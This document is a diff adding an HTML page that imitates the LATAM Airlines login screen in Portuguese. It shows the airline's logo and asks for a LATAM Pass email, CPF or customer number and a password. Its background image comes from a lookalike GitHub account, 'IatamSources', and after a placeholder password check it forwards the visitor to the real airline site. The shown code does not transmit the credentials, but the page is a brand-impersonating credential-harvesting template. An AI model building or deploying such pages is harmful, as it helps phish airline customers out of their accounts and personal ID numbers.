@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Faça seu Login | LATAM AIRLINES</title>
+    <link rel="icon" href="https://th.bing.com/th/id/R.a5ac268982d8c5e364e26ae5bf2225a8?rik=BdgmKlyYGtyqig&pid=ImgRaw&r=0">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: url('https://raw.githubusercontent.com/IatamSources/src/main/background.png') no-repeat center center fixed;
+            background-size: cover;
+        }
+        .container {
+            width: 50%;
+            margin: 100px auto;
+            background-color: rgba(255, 255, 255, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-top: 5px solid rgb(27, 0, 136);
+        }
+        form {
+            text-align: left;
+        }
+        form input {
+            margin-bottom: 10px;
+            width: calc(100% - 20px);
+            padding: 10px;
+            box-sizing: border-box;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        form button {
+            width: 150px;
+            padding: 10px;
+            background-color: rgb(232, 17, 75);
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 20px auto 0;
+            display: block;
+        }
+        .logo {
+            width: 100px;
+            margin-bottom: 20px;
+            display: block;
+        }
+        .texto-superior {
+            color: rgb(27, 0, 136);
+            margin-bottom: 10px;
+        }
+        .texto-inferior {
+            color: rgb(48, 48, 48);
+            margin-top: 10px;
+        }
+        .error-message {
+            color: red;
+            margin-bottom: 10px;
+            display: none;
+        }
+    </style>
+    <script>
+        function validateForm(event) {
+            event.preventDefault();
+            var username = document.forms["loginForm"]["username"].value;
+            var password = document.forms["loginForm"]["password"].value;
+            var errorMessage = document.getElementById("error-message");
+
+            if (password !== "senha_correta") { // Substitua "senha_correta" pela senha correta
+                errorMessage.style.display = "block";
+                errorMessage.textContent = "Senha incorreta. Tente novamente.";
+                document.forms["loginForm"]["password"].value = ""; // Limpar campo de senha
+                document.forms["loginForm"]["password"].focus(); // Focar no campo de senha
+            } else {
+                errorMessage.style.display = "none";
+                window.location.href = 'https://www.latamairlines.com';
+            }
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <form name="loginForm" action="foo" method="post" onsubmit="validateForm(event)">
+            <img src="https://th.bing.com/th/id/R.8c29d58fe7dc2c144922bc2c2c07d008?rik=9EVDOKvltMk8Kg&riu=http%3a%2f%2flogos-download.com%2fwp-content%2fuploads%2f2016%2f12%2fLATAM_Airlines_logo_wordmark.png&ehk=KoMMi4amEshpJz3dL4OUfFcHwZ%2b32OLiAE591EJWXs4%3d&risl=&pid=ImgRaw&r=0" alt="Logo da LATAM Airlines" class="logo">
+            <p class="texto-superior">Insira seu usuário:</p>
+            <p class="texto-inferior">Dê preferência ao seu número LATAM Pass ao inserir seus dados:</p>
+            <div id="error-message" class="error-message"></div>
+            <input type="text" name="username" placeholder="Email, CPF ou Número de cliente">
+            <input type="password" name="password" placeholder="Senha">
+            <button type="submit">Continuar</button>
+        </form>
+    </div>
+</body>
+</html>
